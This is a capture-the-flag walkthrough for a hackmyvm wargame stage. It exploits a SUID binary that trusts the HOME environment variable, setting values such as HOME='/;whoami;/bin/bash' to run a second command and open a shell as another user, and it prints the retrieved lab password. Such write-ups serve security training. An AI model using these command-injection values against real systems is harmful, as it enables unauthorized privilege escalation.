# 0x07
This write-up explains the steps taken to complete mission 0x07 on hades@hackmyvm.eu, starting from user `aphrodite` and escalating to `ariadne`.

## Mission
As always, read the objective first:
```bash
aphrodite@hades:~$ cat mission.txt 
################
# MISSION 0x07 #
################

## EN ##
The user ariadne knows what we keep in our HOME.
```
The mission for this stage focused on the user's home environment.

## Method of solving (Command Injection via Environment Variable)
In the home directory, there is a binary named `homecontent` with **SUID** permissions and the restricted  password file for the next user.
```bash
aphrodite@hades:~$ ls -la
total 52
drwxr-x--- 2 root      aphrodite  4096 Apr  5  2024 .
drwxr-xr-x 1 root      root       4096 Apr  5  2024 ..
-rw-r--r-- 1 aphrodite aphrodite   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 aphrodite aphrodite  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 aphrodite aphrodite   807 Apr 23  2023 .profile
-r--r----- 1 ariadne   ariadne      21 Apr  5  2024 ariadne_pass.txt
-rw-r----- 1 root      aphrodite    22 Apr  5  2024 flagz.txt
-rwS--s--- 1 root      aphrodite 16216 Apr  5  2024 homecontent
-rw-r----- 1 root      aphrodite   185 Apr  5  2024 mission.txt
```

The binary `homecontent` was designed to list the contents of a directory, but it relied on the `$HOME` environment variable to determine which directory to display.
```bash
aphrodite@hades:~$ ./homecontent 
The content of your HOME is:
ariadne_pass.txt  flagz.txt  homecontent  mission.txt
```
Because the program likely used a system call without sanitizing this variable, it was vulnerable to **Command Injection**.

### Step 1: Confirming the Vulnerablity
We test if the program would accept a modified `$HOME` variable. By setting it to a root path followed by a command, we confirm the injection worked.
```bash
aphrodite@hades:~$ HOME="/;whoami" ; ./homecontent 
The content of your HOME is:
bin   dev  home  lib64	mnt  pazz  pwned  run	srv  tmp  var
boot  etc  lib	 media	opt  proc  root   sbin	sys  usr  www
ariadne
```
This command does not execute `whoami` directly; it only assigns the string `"/;whoami"` to the `HOME` variable. It then runs the `homecontent` program with the modified `HOME` environment variable.

### Step 2: Spawning a Privileged Shell
Because the binary had the **SUID** bit set for `ariadne`, we inject a command to spawn a Bash shell. By appending `; /bin/bash` to the variable, the program executes the directory listing and then immediately launch a new shell in the context of the target user.
```bash
aphrodite@hades:/pwned/aphrodite$ HOME="/pwned/;whoami;/bin/bash" ; ./homecontent 
The content of your HOME is:
acantha    arete     athena	 cybele   executor  hermione  leda     penelope
aegle	   ariadne   aura	 cynthia  gaia	    hero      maia     phoebe
alala	   artemis   calliope	 daphne   gemini    hestia    maria    rhea
althea	   asia      calypso	 delia	  hacker    ianthe    nephele  selene
andromeda  asteria   cassandra	 demeter  halcyon   irene     nyx
anthea	   astraea   cassiopeia  echo	  hebe	    iris      pallas
aphrodite  atalanta  clio	 eos	  hera	    kore      pandora
ariadne
ariadne@hades:/pwned/aphrodite$ id
uid=2049(ariadne) gid=2048(aphrodite) groups=2048(aphrodite)
```
**Explanation**:
- **SUID (Set User ID)**: This permission allows a user to run an executable with the permissions of the executable's owner. In this case, the binary allowed aphrodite to act with ariadne's authority.
- **Environment Variable Injection**: Many programs trust system variables like $HOME. If these are passed directly into a shell command (e.g., system("ls " + HOME)), an attacker can use separators like ; to run unauthorized code.
- **The Semicolon (;)**: In Linux, the semicolon is a command separator. It allows the execution of multiple independent commands on a single line.

With the shell running as `ariadne`, we successfully read the password file.
```bash
ariadne@hades:/pwned/aphrodite$ ls  
ariadne_pass.txt  flagz.txt  homecontent  mission.txt
ariadne@hades:/pwned/aphrodite$ cat ariadne_pass.txt 
iNgNazuJrmhJKWixktzk
```
Using the retrieved password, we switch to user `ariadne` via SSH (full-privilege session).
```bash
ariadne@hades:/pwned/aphrodite$ ssh ariadne@localhost
...
ariadne@localhost's password: 
...
ariadne@hades:~$ id ; whoami
uid=2049(ariadne) gid=2049(ariadne) groups=2049(ariadne)
ariadne
```

## Key command
`HOME="/;whoami" ; ./homecontent`

`HOME="/pwned/;whoami;/bin/bash" ; ./homecontent`

***You are welcome!***
